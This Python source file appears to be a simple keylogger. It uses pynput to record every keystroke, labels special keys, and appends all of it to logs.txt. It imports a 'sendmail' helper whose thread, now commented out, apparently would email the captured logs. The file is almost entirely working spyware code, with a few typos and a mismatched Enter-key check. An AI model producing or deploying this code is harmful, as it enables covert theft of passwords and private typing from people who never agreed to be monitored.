from pynput import keyboard
from sendmail import time_verify
import threading

red =  "\033[1;31m" 
reset = "\033[;7m"
green = "\033[0;32m"
blue = "\033[1;34m"

new_name = {
    keyboard.Key.space: " [Space] ",
    keyboard.Key.enter: "[Enter]\n",
    keyboard.Key.shift_l: "[Shift]",
    keyboard.Key.shift_r: "[Shift]",
    keyboard.Key.ctrl_l: "[Ctrl Left]",
    keyboard.Key.ctrl_r: "[Ctrl Right]",
    keyboard.Key.alt_l: "Alt Left]",
    keyboard.Key.alt_r: "[Alt Right]",
    keyboard.Key.tab: "\n[Tab]zn",
    keyboard.Key.backspace: "[Backspace]",
    keyboard.Key.delete: "\n[Delete]\n",
    keyboard.Key.esc: "\n[Esc]\n",
    keyboard.Key.f1: "\n[F1]\n",
    keyboard.Key.f2: "\n[F2]\n",
    keyboard.Key.f3: "\n[F3]\n",
    keyboard.Key.f4: "\n[F4]\n",
    keyboard.Key.f5: "\n[F5]\n",
    keyboard.Key.f6: "\n[F6]\n",
    keyboard.Key.f7: "\n[F7]\n",
    keyboard.Key.f8: "\n[F8]\n",
    keyboard.Key.f9: "\n[F9]\n",
    keyboard.Key.f10: "\n[F10]\n",
    keyboard.Key.f11: "\n[F11]\n",
    keyboard.Key.f12: "\n[F12]\n",
}


#send = threading.Thread(target=time_verify)
#send.start()
log = "logs.txt"

def on_press(key):
    try:
        with open(log, 'a') as file:
            if key in new_name:
                if new_name[key] == "Enter":
                    file.write("\n")
                else:
                    file.write(new_name[key] + "\n") 
            else:
                file.write(str(key))
    except Exception as e:
        print(f"Erro: {e}")

def run():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

run()


